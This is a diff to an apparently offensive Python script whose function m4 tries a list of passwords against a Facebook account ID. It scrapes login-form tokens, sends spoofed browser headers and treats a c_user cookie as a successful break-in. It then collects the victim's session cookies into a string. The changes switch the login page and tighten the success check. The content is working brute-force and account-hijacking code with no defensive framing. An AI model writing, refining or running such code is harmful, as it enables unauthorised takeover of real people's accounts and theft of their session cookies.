@@ -1361,7 +1361,7 @@ def m4(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    ua = random.choice(usragent)
-   free_fb = session.get('https://lm.facebook.com/').text
+   free_fb = session.get('https://mbasic.facebook.com').text
    log_data ={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
     'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
     'api_key': '124024574287414',
@@ -1387,14 +1387,14 @@ def m4(idf,pwv):
     'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY',
     'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), ps),}
    header_freefb ={
-    "authority": f'p.facebook.com',
+    "authority": 'p.facebook.com',
     "method": 'POST',
     "scheme": 'https',
     "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     "accept-encoding": 'gzip, deflate, br',
     "accept-language": 'en-US,en;q=0.9',
     "cache-control": 'no-cache, no-store, must-revalidate',
-    "referer": f'https://p.facebook.com/',
+    "referer": 'https://p.facebook.com/',
     "sec-ch-ua": '"Google Chrome";v="90", "Chromium";v="90"',
     "sec-ch-ua-mobile": '?0',
     "sec-ch-ua-platform": "Windows",
@@ -1409,7 +1409,7 @@ def m4(idf,pwv):
     "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',}#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
    lo = session.post('https://p.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522c6kka2h47zoya97pkk8yrh6y55de8e1jbsrdvpsni3rfeq3w%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D46872004-42b5-4ae5-bf75-9080e2067cae%26tp%3Dunspecified%26cbt%3D1720269002212&lwv=120&lwc=1348028',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
-   if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
+   if 'c_user' in log_cookies :
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f"https://graph.facebook.com/{user}/picture?type=normal"
